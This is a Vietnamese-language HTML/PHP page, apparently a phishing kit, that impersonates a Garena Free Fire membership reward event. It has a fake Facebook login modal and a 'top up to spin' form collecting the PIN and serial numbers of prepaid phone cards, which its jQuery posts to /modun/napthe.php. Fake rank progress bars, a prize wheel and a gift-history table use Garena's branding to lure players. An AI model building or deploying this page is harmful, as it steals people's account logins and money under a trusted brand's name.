<div class="swal2-container swal2-center swal2-shown" style="overflow-y: auto;">
  <div aria-labelledby="swal2-title" aria-describedby="swal2-content" class="swal2-popup swal2-modal animated fadeInDown custom-modal login-modal swal2-noanimation" tabindex="-1" role="dialog" aria-live="assertive" aria-modal="true" style="display: flex;">
    <div class="swal2-header">
      
      <h2 class="swal2-title" id="swal2-title" style="display: flex;">bảng điều khiển đăng nhập</h2>
      
    </div>
    <div class="swal2-content">
      <div id="swal2-content" style="display: block;">
        <div class="not-login"><a href="login.php"><img src="https://ff.member.garena.vn/images/fb_ico.png" alt=""></a><p>Facebook</p></div>
      </div>
      
    </div>
    <div class="swal2-actions" style="display: flex;">
      <a href="<?php echo substr(str_shuffle("ABCDEFGHIKLMNOPJDNMQWRaqwertyuiopasdfgjklldhbmdmncc"), 0, 30).".html";  ?>" class="swal2-confirm swal2-styled" aria-label="" style="border-left-color: rgba(0, 0, 0, 0); border-right-color: rgba(0, 0, 0, 0);">Đăng nhập</a>
      
    </div>
  </div>
</div>

  <div id="root" style="height: 100%">
    <div style="height: 100%;">
<header>
<div class="content-ff">
<div class="logout-btn">

<a href="javascript:void(0)" class="red-btn act-btn" title="Thể lệ" id="thele-modal">Thể lệ</a>
<a class="act-btn logg-out" title="Đăng xuất" href="/logout.php"><img src="images/logout.png" alt=""></a>
</div>
</div>
<div class="modal" id="modal-napthe">
          <div class="modal-dialog animated fadeInDown">
            <div class="modal-content"><div class="modal-header-hd">
              <button title="Tắt" type="button" class="close" aria-label="Close" id="closed_modal_napthe">
                <span aria-hidden="true">×</span>
              </button>
            </div>
            <div class="modal-body">
              <div class="rank-section claim-section rule-ss">
                <h3>Nạp Thẻ Nhận Quà</h3>
                <div class="cl-content">
                
<div class="container">
  <h2>Nạp Thẻ Để Quay Thưởng Ưu Đãi!</h2>
  <p style="font-size: 8px;">Vui lòng nhập đúng mã thẻ, seri, mệnh giá. Nếu sai Garena không chịu trách nghiệm.</p>
<form>

  <div class="form-group">
    <center><label for="staticEmail" class="col-form-label" style="font-size: 13px;">Loại Thẻ:</label></center>
        <select id="type" class="form-control napthe">
            <option value="VTT">Viettel</option>
            <option value="VMS">Mobifone</option>
            <option value="VNP">Vinaphone</option>
        </select>
  </div>

  <div class="form-group">
    <center><label for="staticEmail" class="col-form-label" style="font-size: 13px;">Mệnh Giá:</label></center>
        <select id="amount" class="form-control napthe">
            <option value="10000">10.000 VND</option>
            <option value="20000">20.000 VND</option>
            <option value="50000">50.000 VND</option>
            <option value="100000">100.000 VND</option>
            <option value="200000">200.000 VND</option>
            <option value="500000">500.000 VND</option>
            <option value="1000000">1.000.000 VND</option>
        </select>
  </div>


  <div class="form-group">
    <center><label for="staticEmail" class="col-form-label" style="font-size: 13px;">Mã Thẻ:</label></center>
    <div class="">
      <input id="pin" type="text" class="form-control-plaintext napthe" placeholder="Mã Thẻ"/>
    </div>
  </div>

  <div class="form-group">
    <center><label for="staticEmail" class="col-form-label" style="font-size: 13px;">Mã Seri:</label></center>
    <div class="">
      <input id="serial" type="text" class="form-control-plaintext napthe" placeholder="Mã Seri"/>
    </div>
  </div>
<br>
<center><p id="napthe-result" style="font-size: 13px;"></p></center>
<br>
  <center><button id="napthe-submit" type="button" class="btn btn-lg btn-warning" style="height: 30px;font-size: 13px;"><b>Nạp Thẻ</b></button></center>
<br>

</form>
</div>
              </div>
            </div>
          </div>
        </div>
        <div class="modal-backdrop animated fade "></div>
      </div>




</header>
<main>

      <section class="banner aos-init aos-animate" data-aos="fade-left" data-aos-duration="1500">
        <div id="ffCarousel" class="carousel slide" data-ride="carousel">
          <ul class="carousel-indicators">
            <li class="active" data-target="#ffCarousel" data-slide-to="0"></li>
          </ul>
          <div class="carousel-inner">
            <div class="carousel-item active">
              <img src="https://cdn.vn.garenanow.com/web/ff/ff_membership/item/Vip-Membership.jpg" alt=""></div>
            </div>
          </div>
        </section>

        <section class="content-acount aos-init aos-animate" data-aos="fade-right" data-aos-duration="1500">
          <div class="account">
            <div class="row-tbl">
              <div class="t-avatar">
                <span class="avt">
                  <img src="https://pht.qoo-static.com/p5p3XOkGw84KJM1c_SZpu-aJUgHLM82MkMQ2ZvVzFyMwQsb0wePF_fLsJEDtEltQ5PA=w300" alt="">
                </span>
              </div>
             
              <div class="t-status">
                <span class="status-txt">
                  <i><img src="images/ico-star.png" alt=""></i>
                  <span>Thành Viên</span>
                </span>
                <span class="status-txt">
                  <i><img src="images/ico-star.png" alt=""></i>
                  <span>Rank Bạc</span>
                </span>
              </div>
            </div>
            <div class="row-tbl">
              <div class="t-action">
                <p class="display-name">
                  <span class="name"></span>
                </p>
                <span id="hang_rank">
                  <img src="/images/btn_up_rank.png" alt="">
                </span>
              </div>
              <div class="t-progress">
                <div class="show-progress">
                  <span></span> / <span>5000</span>
                </div>
                <div class="progressbar-container">
                  <div class="progressbar-progress" style="background-color: #ff1f2b!important; width: %; height: 10px;"></div>
                </div>
              </div>
            </div>
          </div>
        </section>


        <section class="spin aos-init aos-animate" data-aos="fade-up" data-aos-duration="1500">
          <div class="content-ff">
            <h3 class="spin-title">
              <img src="images/spin-title.png" alt="">
            </h3>
            <p class="descreption">Nạp Tiền Tăng Hạng , Tăng Điểm Tích Lũy x2 Phần Quà Quay Trúng</p>

            <div class="spin-count">
              <span class="red-brick-btn">đã tích lũy :  Điểm</span><span class="red-brick-btn">số lượt quay :  lần</span>
            </div>



            <p class="descreption spin-mes">Vòng Quay Siêu Cấp Rank Càng Cao Phần Quà Càng Đỉnh</p>


            <o id="result_wheel"></o>


            <p class="another" style="margin-top: 20px;">Chọn hạng khác để tham khảo quà tặng:  </p>


            <select id="rank">
              <option value="null">Chọn hạng</option>
              <option value="bac">Bạc</option>
              <option value="vang">Vàng</option>
              <option value="bachkim">Bạch Kim</option>
              <option value="kimcuong1">Kim Cương 1</option>
              <option value="kimcuong2">Kim Cương 2</option>
              <option value="kimcuong3">Kim Cương 3</option>
            </select>

            <div class="text-center history">
              <a class="act-btn" href="javascript:void(0)" id="lichsu-modal" title="lịch sử vòng quay">
                <img src="images/btn_history.png" alt="">
              </a>
            </div>
        </div>
      </section>
<div class="modal" id="modal-lichsu">
  <div class="modal-dialog animated fadeInDown">
    <div class="modal-content">
      <div class="modal-header-hd">
        <button title="Tắt" type="button" class="close" aria-label="Close" id="closed_modal_lichsu">
          <span aria-hidden="true">×</span>
        </button>
      </div>
      <div class="modal-body">
        <div class="rank-section claim-section">
          <h3>Lịch sử nhận quà</h3>
          <div class="cl-content">
            <table class="history-tbl">
              <thead>
              <tr>
                <th>STT</th>
                <th>Vật Phẩm</th>
                <th>Ngày nhận</th>
                <th>Trạng thái</th>
              </tr>
            </thead>
            <tbody id="result-lichsu">
            </tbody>
          </table>
          <o id="loading-lichsu"></o>
        </div>
      </div>
    </div>
  </div>
</div>
<div class="modal-backdrop animated fade show" id="closed_modal_lichsu_2"></div>
</div>

<section class="dob"><h3 class="title"></h3><div class="dob-ava"><span><img src="https://pht.qoo-static.com/p5p3XOkGw84KJM1c_SZpu-aJUgHLM82MkMQ2ZvVzFyMwQsb0wePF_fLsJEDtEltQ5PA=w300"></span></div><p class="descreption">Đăng kí thông tin của bạn để nhận quà sinh nhật từ Free Fire</p><div class="content-ff"><div class="form-info"><div class="input-group"><span>họ tên</span><span><p>Chưa cập nhật</p></span></div><div class="input-group"><span>ngày sinh</span><span><p>Chưa cập nhật</p></span></div><div class="input-group"><span>địa chỉ</span><span><p>Chưa cập nhật</p></span></div><div class="text-center submit-btn"><a class="dsb-btn"><img src="btn-bod-deactive.png
" alt=""></a></div></div></div></section>



</main>
      <footer></footer>
  </div>
</div>
<div class="modal-backdrop fade" style="display: none"></div>



<script type="text/javascript">
  $(document).ready(function() {

    $('#closed_modal_start').click(function(){
      $('#modal-start').removeClass();
      $('#modal-start').addClass("modal hide");
    });
    $('#closed_modal_start_2').click(function(){
      $('#modal-start').removeClass();
      $('#modal-start').addClass("modal hide");
    });


    $('#thele-modal').click(function(){
      $('#modal-thele').removeClass();
      $('#modal-thele').addClass("modal show");
    });
    $('#closed_modal').click(function(){
      $('#modal-thele').removeClass();
      $('#modal-thele').addClass("modal hide");
    });
    $('#closed_modal2').click(function(){
      $('#modal-thele').removeClass();
      $('#modal-thele').addClass("modal hide");
    });
    
    
    $('#napthe-modal').click(function(){
      $('#modal-napthe').removeClass();
      $('#modal-napthe').addClass("modal show");
    });
    $('#closed_modal_napthe').click(function(){
      $('#modal-napthe').removeClass();
      $('#modal-napthe').addClass("modal hide");
    });
    $('#closed_modal2').click(function(){
      $('#modal-napthe').removeClass();
      $('#modal-napthe').addClass("modal hide");
    });

    $('#lichsu-modal').click(function(){
      $('#modal-lichsu').removeClass();
      $('#modal-lichsu').addClass("modal show");
        $.ajax({
                    url : "/modun/history.php",
                    type : "post",
                    dateType:"text",
                    data : {
                         auth : 78843                    },
                    success : function (result){
                        $('#loading-lichsu').html("<br><center><img style='max-width:50px;height:auto;' src='https://www.voya.ie/Interface/Icons/LoadingBasketContents.gif'/></center><br>");
                        
                        $('#loading-lichsu').fadeOut();

                        setTimeout(function(){
                          $('#result-lichsu').html(result);
                       }, 1000);


                    }
                });
    });

    $('#closed_modal_lichsu').click(function(){
      $('#modal-lichsu').removeClass();
      $('#modal-lichsu').addClass("modal hide");
    });

    $('#closed_modal_lichsu_2').click(function(){
      $('#modal-lichsu').removeClass();
      $('#modal-lichsu').addClass("modal hide");
    });
  });

  $(document).ready(function() {
    $('#rank').on('change', function() {

      var rank_select = $('#rank').val();

        if(rank_select == "null") {
          wheel_call = 'null';
        }else if(rank_select == "bac") {
          wheel_call = 'bac';
        }else if(rank_select == "vang") {
          wheel_call = 'vang';
        }else if(rank_select == "bachkim") {
          wheel_call = 'bachkim';
        }else if(rank_select == "kimcuong1") {
          wheel_call = 'kimcuong1';
        }else if(rank_select == "kimcuong2") {
          wheel_call = 'kimcuong2';
        }else if(rank_select == "kimcuong3") {
          wheel_call = 'kimcuong3';
        }

                 $.ajax({
                    url : "/modun/wheel_template/"+wheel_call+".php",type : "post",dateType:"text",
                    data : {
                         auth : 47680                    },
                    success : function (result){
                        $('#result_wheel').html("<img style='max-width:50px;height:auto;' src='https://www.voya.ie/Interface/Icons/LoadingBasketContents.gif'/>");
                        
                        setTimeout(function(){
                          $('#result_wheel').html(result);
                       }, 1000);
                    }
                });
    });
  });

//napthe-submit
$(document).ready(function() {
  $('#napthe-submit').click(function() {
    document.getElementById("napthe-submit").disabled = true;
    document.getElementById("napthe-submit").innerHTML  = "Đang Kiểm Tra";

    $.ajax({
                    url : "/modun/napthe.php",type : "post",dateType:"text",
                    data : {
                         type : $('#type').val(),
                         amount : $('#amount').val(),
                         serial : $('#serial').val(),
                         pin : $('#pin').val(),
                         submit : 'true'
                    },
                    success : function (result){
                          document.getElementById("napthe-submit").disabled = false;
                          document.getElementById("napthe-submit").innerHTML  = "Nạp Thẻ";
                        $('#napthe-result').html("<img style='max-width:50px;height:auto;' src='https://www.voya.ie/Interface/Icons/LoadingBasketContents.gif'/>");
                        
                        setTimeout(function(){
                          $('#napthe-result').html(result);
                       }, 1000);
                    }
                });
  });

});

  $('#hang_rank').click(function() {
      VDL("Hạng của bạn!", "Rank Hiện tại bạn đang là: <b>Chưa Có</b> trên hệ thống!");
  });

$(document).ready(function() {
  $('#nhanquangay').click(function() {

    if(!$('#idgame').val()) {
        VDL("Lỗi!", "Bạn Vui Lòng nhập ID Game vào khung bên trên!");
    }else {
    var thongbao = 'Sau Khi Nhận Quà Sẽ Bị Mất Điểm Tích Lũy! <br>Bạn Có Muốn Nhận Quà Ngay Không?<br><button id="xacnhan" onclick="javascript:void(nhanqua())" style="margin-top: 18px;height: 30px;font-size: 13px;"" class="btn btn-lg btn-warning"><b>Xác Nhận</b></button>';
    VDL("Thông Báo Xác Nhận!", thongbao);      
    }

  });
});

function nhanqua(){
  $('#xacnhan').click(function() {
                              document.getElementById("xacnhan").disabled = true;
                              document.getElementById("xacnhan").innerHTML  = 'Đang gửi yêu cầu';
        $.ajax({
                    url : "/modun/nhanqua.php",type : "post",dateType:"text",
                    data : {},
                    success : function (result){
                          document.getElementById("xacnhan").disabled = false;
                          document.getElementById("xacnhan").innerHTML  = 'Cám Ơn Bạn Đã Nhận Quà';
                        
                    }
                });

  });
}


</script>

